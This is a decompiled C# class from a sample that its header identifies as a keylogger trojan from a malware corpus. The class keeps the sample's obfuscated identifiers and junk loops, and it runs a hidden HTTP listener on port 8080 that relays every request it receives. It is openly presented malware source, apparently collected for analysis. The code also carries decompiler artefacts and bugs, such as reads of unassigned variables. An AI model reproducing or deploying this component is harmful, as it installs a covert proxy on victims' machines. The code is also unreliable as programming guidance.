// Decompiled with JetBrains decompiler
// Type: ᠘
// Assembly: dskl, Version=1.71.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5380AAD3-568D-45D6-B9BC-59CE5C1E3490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.czk-cde7546df369e926f201a20ea21a174728391b0927412058c56dcdd5367e606c.exe

using System;
using System.IO;
using System.Net;
using System.Text;

internal class \u1818
{
  private HttpListener ᡆᙃ;
  private HttpListenerContext ᡇᙃ;
  private string[] ᡈᙃ;

  public void \u180E(HttpListenerContext c, int Attempts)
  {
    do
      ;
    while (false);
    try
    {
      Console.WriteLine(c.Request.Url.ToString().Replace(":8080", ""));
      HttpListenerRequest request = c.Request;
      HttpListenerResponse response = c.Response;
      WebRequest webRequest = WebRequest.Create(c.Request.Url.ToString().Replace(":8080", ""));
      webRequest.Timeout = 60000;
      byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd());
      response.ContentLength64 = (long) bytes.Length;
      Stream outputStream = response.OutputStream;
      outputStream.Write(bytes, 0, bytes.Length);
      outputStream.Close();
    }
    catch (HttpListenerException ex)
    {
      Console.WriteLine(c.Request.Url.ToString().Replace(":8080", "") + " failed.");
      if (Attempts < 10)
        this.\u180E(c, Attempts++);
      else
        Console.WriteLine("Failed");
      Console.WriteLine(ex.ToString());
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public \u1818()
  {
    do
      ;
    while (false);
    this.ᡈᙃ = new string[1]{ "http://*:8080/" };
    // ISSUE: explicit constructor call
    base.\u002Ector();
    this.ᡆᙃ = new HttpListener();
    try
    {
      if (this.ᡈᙃ.Length > 1)
      {
        foreach (string uriPrefix in this.ᡈᙃ)
          this.ᡆᙃ.Prefixes.Add(uriPrefix);
      }
      else
        this.ᡆᙃ.Prefixes.Add(this.ᡈᙃ[0]);
      this.ᡆᙃ.Start();
      while (this.ᡆᙃ.IsListening)
      {
        this.ᡇᙃ = this.ᡆᙃ.GetContext();
        this.\u180E(this.ᡇᙃ, 0);
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
    this.ᡆᙃ.Stop();
  }
}
